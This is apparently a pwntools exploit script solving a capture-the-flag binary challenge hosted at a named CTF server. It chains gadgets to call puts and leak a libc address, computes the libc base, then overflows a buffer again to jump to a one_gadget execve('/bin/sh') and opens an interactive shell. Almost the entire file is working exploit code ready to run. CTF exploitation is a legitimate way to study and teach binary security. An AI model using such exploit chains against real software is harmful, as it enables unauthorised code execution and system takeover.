import argparse
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
gdb_cmd = [
	"b *0x400689",
	"c"
]

# Binary names
bin_fname = './challenge'
libc_fname = './libc.so.6'

# Remote
IP = 'university.opentoallctf.com'
PORT = 30004

# SSH
URL = ''
username = ''
password = ''
bin_abs_path = ''

# Create ELF objects
e = ELF(bin_fname)
libc = ELF(libc_fname) if libc_fname else None
x64 = e.bits != 32

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
	p = remote(IP, PORT)
elif args.local or args.attach:
	p = process(proc_args, env={"LD_PRELOAD" : libc_fname}) if libc_fname else process(proc_args)
	if args.attach:
		gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
	s = ssh(host=URL, user=username, password=password)
	s.set_working_directory(bin_abs_path)
	p = s.process(proc_args)
else:
	p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd), env={"LD_PRELOAD" : libc_fname}) if libc_fname else gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
	p.recvline() # Read "Remote debugging from 127.0.0.1" string

"""
	Exploit

	Examples:
	func_offset = libc.symbols['puts'] 	# Offset in libc
	puts_addr = p32(e.got['puts'])
	main = e.symbols['main']
	addr_string = next(e.search('/bin/cat flag.txt'))
"""

onegadget = 0x45216 # execve("/bin/sh"...) constraints: rax == NULL
'''
0x000    -------------------
$rbx:
$rbx+8: 0x000000000040068b : mov rax, qword ptr [rbx + 8] ; add rbx, 8 ; jmp r9      <- $rbx
$rbx+16: e.got['puts']                                                               <- $rbx
$rbx+24: 0x0000000000400696 : mov rdi, rax ; jmp r9                                  <- $rbx
$rbx+32: 0x000000000040064a : call _puts                                             <- $rbx
...
0x100    ---------------------
'''

# Call puts to print address of puts
p.recvuntil('Give me some data:')
buffer = 'a' * 8
buffer += p64(0x000000000040068b) # Put next 8 bytes into $rax
buffer += p64(e.got['puts'])
buffer += p64(0x0000000000400696) # mov rdi, rax
buffer += p64(0x000000000040064a) # call puts
p.sendline(buffer)

# Calculate base of libc and shell addr
leaked_addr = u64(p.recvn(7)[1:].ljust(8, '\x00'))
libc_base = leaked_addr - libc.symbols['puts']
shell_addr = libc_base + onegadget
log.info('Puts Addr: {}'.format(hex(leaked_addr)))
log.info('Libc Base: {}'.format(hex(libc_base)))
log.info('Shell Addr: {}'.format(hex(shell_addr)))

# Set $rax = 0 and jump to one_gadget address
buffer = 'a' * 8
buffer += p64(0x000000000040068b) # mov rax, qword ptr [rbx + 8] ; add rbx, 8 ; jmp r9
buffer += p64(0)
buffer += p64(shell_addr)
p.sendline(buffer)

# Send buffer and interact
p.interactive()
